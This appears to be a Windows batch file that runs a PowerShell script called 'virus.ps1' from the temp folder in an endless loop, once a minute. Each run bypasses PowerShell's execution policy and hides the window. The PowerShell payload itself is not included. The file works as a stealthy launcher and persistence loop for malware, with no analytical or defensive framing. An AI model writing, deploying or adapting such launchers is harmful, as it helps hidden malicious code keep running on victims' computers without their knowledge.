@echo off
:loop
   powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%temp%\virus.ps1"
   timeout /t 60 >nul
goto loop
